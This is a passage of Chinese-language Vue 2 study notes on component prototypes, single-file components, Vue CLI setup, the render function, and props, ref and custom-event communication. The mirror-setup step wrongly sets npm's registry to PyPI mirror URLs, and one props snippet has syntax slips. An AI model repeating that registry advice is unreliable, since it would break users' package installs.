为什么要这么设计？**<font style="color:#FF0000;">代码复用</font>**。Vue原型对象上有很多方法，例如：$mount()，对于组件VueComponent来说就不需要再额外提供了，直接使用vc调用$mount()，代码得到了复用。

Vue框架是如何实现以上机制的呢？

<font style="color:#000000;">VueComponent.prototype.__proto__ = Vue.prototype </font>

#### 1、回顾原型对象
<font style="color:#595959;">  <script></font>

<font style="color:#595959;">      // prototype  __proto__</font>



<font style="color:#595959;">      // 构造函数（函数本身又是一种类型，代表Vip类型）</font>

<font style="color:#595959;">      function Vip() {}</font>



<font style="color:#595959;">      // Vip类型/Vip构造函数，有一个 prototype 属性。</font>

<font style="color:#595959;">      // 这个prototype属性可以称为：显式的原型属性。</font>

<font style="color:#595959;">      // 通过这个显式的原型属性可以获取：原型对象</font>



<font style="color:#595959;">      // 获取Vip的原型对象</font>

<font style="color:#595959;">      let x = Vip.prototype;</font>



<font style="color:#595959;">      // 通过Vip可以创建实例</font>

<font style="color:#595959;">      let a = new Vip();</font>

<font style="color:#595959;">      // 对于实例来说，都有一个隐式的原型属性: __proto__</font>

<font style="color:#595959;">      // 注意：显式的(建议程序员使用的)。隐式的（不建议程序员使用的。）</font>

<font style="color:#595959;">      </font>

<font style="color:#595959;">      // 这种方式也可以获取到Vip的原型对象</font>

<font style="color:#595959;">      let y = a.__proto__;</font>



<font style="color:#595959;">      // 原型对象只有一个，其实原型对象都是共享的。</font>

<font style="color:#595959;">      console.log(x === y); // true</font>



<font style="color:#595959;">      // 作用：</font>

<font style="color:#595959;">      // 在给“Vip的原型对象”扩展属性</font>

<font style="color:#595959;">      Vip.prototype.counter = 1000;</font>



<font style="color:#595959;">      // 通过a实例可以访问这个扩展的counter属性吗？可以访问。为什么？原理是啥？</font>

<font style="color:#595959;">      // 访问原理：首先去a实例上找counter属性，如果a实例上没有counter属性的话，</font>

<font style="color:#595959;">      //会沿着__proto__这个原型对象去找。</font>

<font style="color:#595959;">      </font>

<font style="color:#595959;">      // 下面代码看起来表面上是a上有一个counter属性，实际上不是a实例上的属性，是a实例对应的原型对象上的属性counter。</font>

<font style="color:#595959;">      console.log(a.counter);</font>

<font style="color:#595959;">      //console.log(a.__proto__.counter)</font>

<font style="color:#595959;">    </script></font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433649559-15630e3a-1f7c-43a9-8666-0f85596bbfb1.png)

#### 2、底层实现
<font style="color:#000000;">VueComponent.prototype.__proto__ = Vue.prototype </font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433649860-550c964b-f85c-47be-a3da-8c800fd4fd4e.png)

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <user></user></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // 创建组件</font>

<font style="color:#595959;">      const user = Vue.extend({</font>

<font style="color:#595959;">        template: `</font>

<font style="color:#595959;">            <div></font>

<font style="color:#595959;">                <h1>user组件</h1></font>

<font style="color:#595959;">            </div></font>

<font style="color:#595959;">            `,</font>

<font style="color:#595959;">        mounted() {</font>

<font style="color:#595959;">          // this是VueComponent实例</font>

**<font style="color:#FF0000;">          // user是什么呢？？？？是一个全新的构造函数 VueComponent构造函数。</font>**

**<font style="color:#FF0000;">          // 为什么要这样设计？为了代码复用。</font>**

**<font style="color:#FF0000;">          // 底层实现原理：</font>**

**<font style="color:#FF0000;">          // VueComponent.prototype.__proto__ = Vue.prototype</font>**

<font style="color:#595959;">          console.log("vc.counter", this.counter);</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">      // vm</font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "vm与vc",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        components: {</font>

<font style="color:#595959;">          user,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        mounted() {</font>

<font style="color:#595959;">          // this是Vue实例</font>

<font style="color:#595959;">          console.log("vm", this);</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>



<font style="color:#595959;">      // 这个不是给Vue扩展counter属性。</font>

<font style="color:#595959;">      // 这个是给“Vue的原型对象”扩展一个counter属性。</font>

<font style="color:#595959;">      Vue.prototype.counter = 1000;</font>

<font style="color:#595959;">      console.log("vm.counter", vm.counter);</font>

<font style="color:#595959;">      // 本质上是这样的：</font>

<font style="color:#595959;">      console.log("vm.counter", vm.__proto__.counter);</font>

<font style="color:#595959;">      console.log("user.prototype.__proto__ === Vue.prototype", user.prototype.__proto__ === Vue.prototype);</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>











### **《3.2、单文件组件》**
### 3.2.1. 什么是单文件组件？
(1) **一个文件对应一个组件**（之前我们所学的是非单文件组件，一个html文件中定义了多个组件）

(2) 单文件组件的名字通常是：x.vue，这是Vue框架规定的，只有Vue框架能够认识，浏览器无法直接打开运行。需要Vue框架进行编译，将x.vue最终编译为浏览器能识别的html js css。

(3) 单文件组件的文件名命名规范和组件名的命名规范相同：

① 全部小写：userlist

② 首字母大写，后面全部小写：Userlist

③ kebab-case命名法：user-list

④ CamelCase命名法：UserList（我们使用这种方式，和Vue开发者工具呼应。）

<font style="color:#DF2A3F;">注意：不能用小驼峰：userList </font>

<font style="color:#DF2A3F;">不能用html标签名</font>

### 3.2.2. x.vue文件的内容包括三块：
(1) 结构：<template>HTML代码</template>

(2) 交互：<script>JS代码</script>

(3) 样式：<style>CSS代码</style>

### 3.2.3. export和import，ES6的模块化语法。
(1) 使用export导出（暴露）组件，在需要使用组件的x.vue文件中使用import导入组件

<font style="color:#FF0000;">① 默认导入和导出</font>

<font style="color:#FF0000;">1) export default {}</font>

<font style="color:#FF0000;">2) import 任意名称 from ‘模块标识符’</font>

② 按需导入和导出

1) export {a, b}

2) import {a, b} from ‘模块标识符’

③ 分别导出

暴露

export var name = ‘zhangsan’

export function sayHi(){}

导入：

import {name, sayHi} from ‘模块标识符’

### 3.2.4. VScode插件
VSCode工具可以安装一些插件，这样在编写x.vue的时候有提示。例如：<font style="color:#FF0000;">vetur插件</font>。

(1) 使用该插件之后，有高亮显示，并且也可以通过输入 

### 3.2.5、第一个单文件组件
把之前“组件嵌套”的例子修改为单文件组件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433650148-d45e0b53-52c0-4196-ab8f-80bc8bbd3ff5.png)

记住一个要领：不管是单文件组件还是非单文件组件，永远都包括三步：创建组件、注册组件、使用组件。

创建vm的代码就不是一个组件了，这个js代码写到一个js文件中即可，一般这个起名：main.js。寓意：入口

还剩最后的一点HTML代码，一般这个文件叫做index.html，代码如下：

<font style="color:#FF0000;">代码执行原理：</font>

<font style="color:#FF0000;">① 第一步：浏览器打开index.html页面，加载容器</font>

<font style="color:#FF0000;">② 第二步：加载vue.js文件，有了Vue</font>

<font style="color:#FF0000;">③ 第三步：加载main.js</font>

<font style="color:#FF0000;">1) import App from ‘./App.vue’</font>

<font style="color:#FF0000;">2) import son from './son.vue'</font>

<font style="color:#FF0000;">3) import gril from './gril.vue'</font>

<font style="color:#FF0000;">4) import child from './child.vue'</font>

<font style="color:#FF0000;">这样就完成了所有组件以及子组件的创建和注册。</font>

<font style="color:#FF0000;">④ 第四步：创建Vue实例vm，编译模板语句，渲染。</font>

写完之后不能直接运行，浏览器不认识.vue文件，不认识ES6的模块化语法。需要安装Vue脚手架。





### 《3.3、Vue脚手架》
### 3.3.1 确保npm能用（安装Node.js） 
Node.js的下载地址:

[https://nodejs.org/zh-cn/download/](https://nodejs.org/zh-cn/download/" \t "_blank)

直接下一步下一步安装就行

安装结束后，打开终端，输入npm命令，注意配置环境变量

### 3.3.2 Vue CLI（脚手架安装） 
#### 1、 Vue的脚手架简介
Vue的脚手架（Vue CLI: Command Line Interface）是Vue官方提供的标准化开发平台。它可以将我们.vue的代码进行编译生成html css js代码，并且可以将这些代码自动发布到它自带的服务器上，为我们Vue的开发提供了一条龙服务。脚手架官网地址：

[https://cli.vuejs.org/zh](https://cli.vuejs.org/zh" \t "_blank)

注意：Vue CLI 4.x需要Node.js v8.9及以上版本，推荐v10以上。

#### 2、脚手架安装步骤：
① 建议先配置一下npm镜像：(可装可不装)

1) 豆瓣镜像：<font style="color:#4D4D4D;">npm config set registry </font>[http://pypi.douban.com/simple/](http://pypi.douban.com/simple/" \t "_blank) 

清华镜像：<font style="color:#4D4D4D;">npm config set registry </font>[https://pypi.tuna.tsinghua.edu.cn/simple](https://pypi.tuna.tsinghua.edu.cn/simple" \t "_blank)

切回原来的npm包：<font style="color:#4D4D4D;">npm config set registry </font>[<font style="color:#4EA1DB;">https://registry.npmjs.org</font>](https://registry.npmjs.org/" \t "_blank)

2)终端输入： npm config get registry 

返回成功对应进行地址，表示设置成功

② 第一步：安装脚手架（全局方式：表示只需要做一次即可）

1) npm install -g @vue/cli 

2) 安装完成后，重新打开DOS命令窗口，输入vue --version命令查看脚手架版本

有版本信息，表示成功

③ 第二步：创建项目（项目中自带脚手架环境，自带一个HelloWorld案例）

##### 第一种方式
1) 切换到要创建项目的目录，然后使用 vue create vue_pro

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433650371-5967fd68-2ca9-4a7b-8972-5c7be58c7b0d.png)

这里选择Vue2，

babel：负责ES6语法转换成ES5。

eslint：负责语法检查的。

回车之后，就开始创建项目，创建脚手架环境（内置了webpack loader），自动生成HelloWorld案例。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433650653-eaf6442d-030d-40e2-b68b-2d799f3564d6.png)

③ 第三步：编译Vue程序，自动将生成html css js放入内置服务器，自动启动服务。

1) dos命令窗口中切换到项目根：cd vue_pro

2) 执行：npm run serve，这一步会编译HelloWorld案例

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433651089-e44e49ee-a250-499a-adb9-cf5d2eb3ade9.png)

ctrl + c停止服务。

3) 打开浏览器，访问：[http://localhost:8080](http://localhost:8080" \t "_blank)

##### 第二种方式
<font style="color:#555666;">在终端输入vue ui 运行之后跳转到http://localhost:8000/</font><font style="color:#4EA1DB;">dashboard</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433651302-1af6fe82-bd57-43b3-b3f3-62615d22e1ac.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433651555-00d2959e-5224-4811-a3e0-819fe426a233.png)

<font style="color:#555666;">点击左上角wordvue选择</font>[Vue项目](https://so.csdn.net/so/search?q=Vue%E9%A1%B9%E7%9B%AE&spm=1001.2101.3001.7020" \t "_blank)<font style="color:#555666;">管理器，打开之后可以创建项目 也可以打开之前已有的项目</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433651774-e53e55aa-dff1-4d6d-ba5d-ede1b8947bd1.png)

<font style="color:#555666;">选择创建项目，然后选择项目所在的目录，这次依旧放在桌面上</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433651991-9eddc699-e47f-414e-b584-dd6522dbc463.png)

<font style="color:#555666;">填写项目名称，包管理一般选默认，git仓库看个人需求</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433652196-31835338-cfae-4b21-b1fa-d8e39e01b018.png)

<font style="color:#555666;">预设就是手动选择配置项，和第一种方法一样</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433652400-b5a0be67-c039-4eff-8a18-2b019739d75c.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433652853-98726dd1-21d5-4a6e-a9d4-cf9865812324.png)

<font style="color:#555666;">配置也是一样的</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433653081-1f99c886-c17c-4b07-8042-0e68f218859a.png)

<font style="color:#555666;">创建成功之后，会自动进入app项目</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433653335-c18a9aa7-d8a8-424b-96bc-82ed14d0a128.png)

<font style="color:#555666;">安装依赖（用vue ui安装依赖非常简单，直接搜索然后安装）</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433653574-8f739f7f-c4ba-446b-a575-b33d31851327.png)

### 3.3.3 认识脚手架结构 
使用VSCode将vue项目打开：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433653834-599f4b31-323d-41f6-957e-8a0c3cd299b7.png)

package.json：包的说明书（包的名字，包的版本，依赖哪些库）。该文件里有webpack的短命令：

serve（启动内置服务器）

build命令是最后一次的编译，生成html css js，给后端人员

lint做语法检查的。

### 3.3.4 分析HelloWorld程序 
#### 1、index.html
<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang=""></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="utf-8" /></font>

<font style="color:#595959;">    <!-- 让IE浏览器启用最高渲染标准。IE8是不支持Vue的。 --></font>

<font style="color:#595959;">    <meta http-equiv="X-UA-Compatible" content="IE=edge" /></font>

<font style="color:#595959;">    <!-- 开启移动端虚拟窗口（理想视口） --></font>

<font style="color:#595959;">    <meta name="viewport" content="width=device-width,initial-scale=1.0" /></font>

<font style="color:#595959;">    <!-- 设置页签图标 --></font>

<font style="color:#595959;">    <link rel="icon" href="<%= BASE_URL %>favicon.ico" /></font>

<font style="color:#595959;">    <!-- 设置标题 --></font>

<font style="color:#595959;">    <title>欢迎使用本系统</title></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- 当浏览器不支持JS语言的时候，显示如下的提示信息。 --></font>

<font style="color:#595959;">    <noscript></font>

<font style="color:#595959;">      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></font>

<font style="color:#595959;">    </noscript></font>

<font style="color:#595959;">    <!-- 容器 --></font>

<font style="color:#595959;">    <div id="app"></div></font>

<font style="color:#595959;">    <!-- built files will be auto injected --></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

在index.html文件中：

没有看到引入vue.js文件。

也没有看到引入main.js文件。Vue脚手架会自动找到main.js文件。不需要你手动引入。

所以main.js文件的名字不要随便修改，main.js文件的位置不要随便动。

#### 2、main.js
<font style="color:#595959;">// 等同于引入vue.js</font>

<font style="color:#595959;">import Vue from 'vue'</font>

<font style="color:#595959;">// 导入根组件</font>

<font style="color:#595959;">import App from './App.vue'</font>

<font style="color:#595959;">// 关闭生产提示信息</font>

<font style="color:#595959;">Vue.config.productionTip = false</font>

<font style="color:#595959;">// 创建Vue实例</font>

<font style="color:#595959;">new Vue({</font>

<font style="color:#595959;">  render: h => h(App),</font>

<font style="color:#595959;">}).$mount('#app')</font>

#### 3、es语法检测。
如果用单字母表示组件的名字，会报错，名字应该由多单词组成。

解决这个问题有两种方案：

第一种：把所有组件的名字修改一下。

第二种：**在vue.config.js文件中进行脚手架的默认配置**。配置如下：

<font style="color:#595959;">const { defineConfig } = require('@vue/cli-service')</font>

<font style="color:#595959;">module.exports = defineConfig({</font>

<font style="color:#595959;">  transpileDependencies: true</font>

<font style="color:#595959;">  </font>**<font style="color:#595959;">// 保存时是否进行语法检查。true表示检查，false表示不检查。默认值是true。</font>**

**<font style="color:#595959;">  lintOnSave : false,</font>**

**<font style="color:#595959;">  // 配置入口</font>**

**<font style="color:#595959;">  pages: {</font>**

**<font style="color:#595959;">    index: {</font>**

**<font style="color:#595959;">      entry: 'src/main.js',</font>**

**<font style="color:#595959;">    }</font>**

**<font style="color:#595959;">  },</font>**

<font style="color:#595959;">})</font>

### 3.3.5 脚手架默认配置 
**脚手架默认配置在vue.config.js文件中进行。**

**main.js、index.html等都是可以配置的。**

配置项可以参考Vue CLI官网手册，如下：

<font style="color:#595959;">// vue.config.js</font>

<font style="color:#595959;">const { defineConfig } = require("@vue/cli-service");</font>



<font style="color:#595959;">module.exports = defineConfig({</font>

<font style="color:#595959;">  transpileDependencies: true,</font>

<font style="color:#595959;">  // 保存时是否进行语法检查。true表示检查，false表示不检查。默认值是true。</font>

<font style="color:#595959;">  lintOnSave: false,</font>

<font style="color:#595959;">  // 配置入口</font>

<font style="color:#595959;">  pages: {</font>

<font style="color:#595959;">    index: {</font>

<font style="color:#595959;">      entry: "src/main.js",</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">});</font>

### 3.3.6 解释main.js中的render函数 
将render函数更换为：template配置项，你会发现它是报错的。说明引入的Vue无法进行模板编译。

原因：**Vue脚手架默认引入的是精简版的Vue，这个精简版的Vue缺失模板编译器。**

实际引入的vue.js文件是：dist/vue.runtime.esm.js（esm版本是ES6模块化版本）

为什么缺失模板编译器？

Vue包含两部分：**一部分是Vue的核心，一部分是模板编译器**（模板编译器可能占整个vue.js文件的一大部分体积）。程序员最终使用webpack进行打包的时候，显然Vue中的模板编译器就没有存在的必要了。**为了缩小体积**，所以在Vue脚手架中直接引入的就是一个缺失模板编译器的vue.js。

这样就会导致template无法编译（注意：标签可以正常编译[package.json文件中进行了配置]，说的是template配置项无法编译），解决这个问题包括两种方式：

第一种方式：引入一个完整的vue.js

第二种方式：使用render函数

关于render函数，完整写法：

<font style="color:#595959;">// 等同于引入vue.js</font>

<font style="color:#595959;">import Vue from "vue";</font>

<font style="color:#595959;">// 导入根组件</font>

<font style="color:#595959;">import App from "./App.vue";</font>

<font style="color:#595959;">// 关闭生产提示信息</font>

<font style="color:#595959;">Vue.config.productionTip = false;</font>

<font style="color:#595959;">// 创建Vue实例</font>

<font style="color:#595959;">// new Vue({</font>

<font style="color:#595959;">//   render: (h) => h(App),</font>

<font style="color:#595959;">// }).$mount("#app");</font>



<font style="color:#595959;">// 创建Vue实例</font>

<font style="color:#595959;">new Vue({</font>

<font style="color:#595959;">  el: "#app",</font>

<font style="color:#595959;">  // 此时会报错，因为引入的vue.js是缺少版本的</font>

<font style="color:#595959;">  // 解决方案</font>

<font style="color:#595959;">  // 1、引入完整的vue.js</font>

<font style="color:#595959;">  // 2、使用render函数</font>

<font style="color:#595959;">  template: "<h1>render函数</h1>",</font>

<font style="color:#595959;">  // render函数会被自动调用，被调用时，会自动传过来一个参数，可以用来创建元素</font>

<font style="color:#595959;">  // render(createElement) {</font>

<font style="color:#595959;">  //   return createElement(App);</font>

<font style="color:#595959;">  // },</font>

<font style="color:#595959;">  // 简写为箭头函数</font>

<font style="color:#595959;">  render: (h) => h(App),</font>

<font style="color:#595959;">});</font>





**《3.4-9、组件通讯》**

### 3.4.1、<font style="color:#DF2A3F;">props配置</font>
**<font style="color:#FF0000;">props配置项，让组件接收外部传过来的数据</font>**

一般是父组件给子组件传递，props配置在子组件内接收父组件传递的数据,也可以让父元素接受到子元素的数据

父组件===》子组件 传递数据 用的比较多

子组件==> 父组件 传递数据 用的比较少

#### 3.4.1.1、传递数据（父组件里传递给子组件）
<Demo name="李四" sex='女' :age="18" :ceshi='ceshi'/>

这里的age，测试前面加：，也就是v-bind，表明里面是表达式

#### 3.4.1.2、接收数据（子组件内接收数据）
##### 接收一：数组方式（只接收）
<font style="color:#595959;">props: ["name", "age", "sex", "ceshi"],</font>

##### 接收二 ：对象方式（限制类型）
<font style="color:#595959;"> props:{</font>

<font style="color:#595959;">     name:String,</font>

<font style="color:#595959;">     age:Number,</font>

<font style="color:#595959;">     sex:String</font>

<font style="color:#595959;">     ceshi：Object</font>

<font style="color:#595959;">   } </font>

##### 接收三：对象方式（限制类型，限制必要性，指定默认值）
<font style="color:#595959;">props: {</font>

<font style="color:#595959;">    name: {</font>

<font style="color:#595959;">      type: String, //name的类型是字符串</font>

<font style="color:#595959;">      required: true, //name是必要的</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    age: {</font>

<font style="color:#595959;">      type: Number,</font>

<font style="color:#595959;">      default: 99, //默认值</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    sex: {</font>

<font style="color:#595959;">      type: String,</font>

<font style="color:#595959;">      required: true,</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    ceshi: {</font>

<font style="color:#595959;">      type: Object,</font>

<font style="color:#595959;">      required: true,</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  },</font>

#### 3.4.1.3、注意：
**<font style="color:#FF0000;">props是只读的</font>**，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，**<font style="color:#FF0000;">若业务需求确实需要修改，请复制props的内容到data中，然后去修改data中的数据</font>**

**<font style="color:#FF0000;">对于传递的复杂数据类型，是无法监测到内容值的改变，除非修改地址值</font>**

<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  name: "Student",</font>

<font style="color:#595959;">  data() {</font>

<font style="color:#595959;">    console.log(this);</font>

<font style="color:#595959;">    return {</font>

<font style="color:#595959;">      msg: "我是学生",</font>

<font style="color:#595959;">      myAge: this.age,//复制props接收到的数据到myAge</font>

<font style="color:#595959;">    };</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  methods: {</font>

<font style="color:#595959;">    updateAge() {</font>

<font style="color:#595959;">      this.myAge++;//</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  //接收一：简单声明</font>

<font style="color:#595959;">  props: ["name", "age", "sex", "ceshi"],</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">  </script></font>

#### 3.4.1.4、子传递数据给父
1、**<font style="color:#FF0000;">在父组件中定义方法，去接收</font>**，去处理子组件传递的数据

<font style="color:#595959;">//1、 接受子组件传递的数据</font>

<font style="color:#595959;">    handleGirlInfo(value){</font>

<font style="color:#595959;">       console.log(`接受到了girl组件传递的数据${value}`);</font>

<font style="color:#595959;">    }</font>

2、**<font style="color:#FF0000;">将父组件的方法，传递给子组件</font>**

<font style="color:#595959;"><!-- 2、将方法传递给子组件 --></font>

<font style="color:#595959;">    <girl msg="hello,girl" a="666" :m="m" :handleGirlInfo="handleGirlInfo"/></font>

3、子组件接收父组件传递的方法，并且**<font style="color:#FF0000;">调用这个方法</font>**，调用的同时**<font style="color:#FF0000;">，传递数据</font>**

<font style="color:#595959;">// 接受方式一</font>

<font style="color:#595959;">    props: ['msg', 'a', 'm', 'handleGirlInfo'],</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            girlInfo: '我是girl组件'</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        // 3、子组件触发父组件传递的方法，同时传递实参过去</font>

<font style="color:#595959;">        sendInfo() {</font>

<font style="color:#595959;">            this.handleGirlInfo(this.girlInfo)</font>

<font style="color:#595959;">        }</font>



<font style="color:#595959;">    }</font>

### 3.4.2、ref配置
#### 3.4.2.1、从父组件中获取子组件 
**<font style="color:#FF0000;">在组件上使用ref属性进行标识：</font>**

**<font style="color:#FF0000;">在程序中使用$refs来获取子组件：</font>**

**<font style="color:#FF0000;">this.$refs.userJack</font>**

**<font style="color:#FF0000;">访问子组件的属性：</font>**

**<font style="color:#FF0000;">this.$refs.userJack.name</font>**

#### 3.4.2.2、获取DOM
ref也可以使用在普通的HTML标签上，这样**<font style="color:#FF0000;">获取</font>**的就是这个**<font style="color:#FF0000;">DOM元素</font>**：

<input type=”text” ref=”username”>

this.$refs.username

App.vue 父组件

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <!-- 2.1 给标签打标记 --></font>

<font style="color:#595959;">    <h1 ref="hh">App组件</h1></font>

<font style="color:#595959;">   </font>**<font style="color:#595959;"> <!--1.1 </font>****<font style="color:#595959;">第一步：ref给子组件打标记</font>****<font style="color:#595959;"> --></font>**

<font style="color:#595959;">    <son ref="boy"></son></font>

<font style="color:#595959;">    <button @click="getmsg">点击获取son组件数据</button></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">import son from './components/son.vue'</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  // 需求：从父组件中获取子组件的数据信息，姓名，年龄</font>

<font style="color:#595959;">  methods: {</font>

<font style="color:#595959;">    getmsg() {</font>

<font style="color:#595959;">      //1.2 </font>**<font style="color:#595959;">第二步：通过vc上的$refs.标记名 获取子组件</font>**

<font style="color:#595959;">      console.log(this.$refs.boy.name);</font>

<font style="color:#595959;">      console.log(this.$refs.boy.age);</font>



<font style="color:#595959;">      // 2.2 通过vc上de $refs.标记名获取dom</font>

<font style="color:#595959;">      console.log(this.$refs.hh);</font>



<font style="color:#595959;">    }</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  components: { son }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

### 3.4.3、<font style="color:#FF0000;">组件自定义事件</font>
click、keydown、keyup，这些事件都是内置事件。

Vue也支持给**<font style="color:#FF0000;">组件</font>**添加自定义事件。

包括两种方式：

**<u><font style="color:#595959;">第一种方式：直接在组件标签上绑定事件</font></u>**

**<u><font style="color:#595959;">第二种方式：通过代码来给组件绑定事件 </font></u>**

#### 3.4.3.1 直接在组件标签上绑定事件 
##### 1.关于内置事件的实现步骤。
第一步：提供事件源（以下这个按钮就是一个事件源）

第二步：给事件源绑定事件 v-on:事件名 或者 @事件名 

第三步：编写回调函数，将回调函数和事件进行绑定

第四步：等待事件的触发，只要事件触发，则执行回调函数。

##### 2.关于组件的自定义事件，实现步骤：
第一步：提供事件源（这个事件源是一个组件）

第二步：给组件绑定事件 v-on:事件名 或者 @事件名 

第三步：编写回调函数，将回调函数和事件进行绑定

第四步：等待事件的触发，只要事件触发，则执行回调函数。

对于组件自定义事件来说，要想让事件发生，需要去执行一段代码。这段代码负责去触发这个事件，让这个事件发生。 

这段代码在哪里写？

事件绑定在A组件上，则触发这个事件的代码要在A组件当中编写。

<font style="color:#595959;">//·····</font>

<font style="color:#595959;"><div id="app" class="bg"></font>

<font style="color:#595959;">    <h1>App组件</h1></font>

<font style="color:#595959;">  </font>**<font style="color:#FF0000;">  <girl @resiveMsg="resiveMsg" /></font>**

<font style="color:#595959;">    <son /></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;">// ·····</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">    resiveMsg(msg) {</font>

<font style="color:#595959;">      console.log('接受子组件传递的数据：', msg);</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">//····</font>

<font style="color:#595959;"><div class="bg"></font>

<font style="color:#595959;">      <h2>girl组件</h2></font>

<font style="color:#595959;">      <button @click="sendMsg">传递数据</button></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;">//·····</font>

<font style="color:#595959;"> methods: {</font>

<font style="color:#595959;">      sendMsg() {</font>

**<font style="color:#FF0000;">          this.$emit('resiveMsg', 666)</font>**

<font style="color:#595959;">      }</font>

<font style="color:#595959;">  }</font>

##### 3.父子组件之间如何通信
总结：到目前为止，父子组件之间如何通信

父---子： props

子---父：

第一种方式：**<u>在父中定义一个方法，将方法传递给子，然后在子中调用父传过来的方法，这样给父传数据。</u>**（这种方式以后很少使用）

第二种方式：**<u>使用组件的自定义事件的方式，也可以完成子向父传数据。</u>**

App组件是父组件、User组件是子组件 

子组件向父组件传数据（User给App组件传数据）：

在父组件当中绑定事件。

在子组件当中触发事件。

**<font style="color:#FF0000;">父绑定，子触发。（这句话记住）//绑定接受，触发传递</font>**

##### 4. 事件修饰符
对于事件的once修饰符来说，组件的自定义事件也是可以使用的。

app.vue 父组件：绑定自定义事件

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div class="app"></font>

<font style="color:#595959;">        <h1>app父组件</h1></font>

<font style="color:#595959;">        <!-- 绑定自定义事件 --></font>

<font style="color:#595959;">      </font>**<font style="color:#595959;">  <!-- 在父组件里给子组件上绑定自定义事件，到子组件内去触发自定义事件 --></font>**

<font style="color:#595959;">        <!-- <helloworld @event2="fun2" /> --></font>

<font style="color:#595959;">        </font>**<font style="color:#595959;"><!-- 自定义事件也可以使用事件修饰符 --></font>**

<font style="color:#595959;">        <helloworld @event2.once="fun2" /></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>

<font style="color:#595959;"><script></font>

<font style="color:#595959;">·····</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'app',</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        </font>**<font style="color:#595959;">//自定义事件的函数,可以接收子组件传递过来的数据，如果是多个数据，可以用</font>****<font style="color:#FF0000;">扩展运算符接收</font>**

<font style="color:#595959;">        fun2(msg,...params) {</font>

<font style="color:#595959;">                    console.log('自定义事件触发了····,', msg,params);</font>

<font style="color:#595959;">                }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">····</font>

<font style="color:#595959;">}</font>

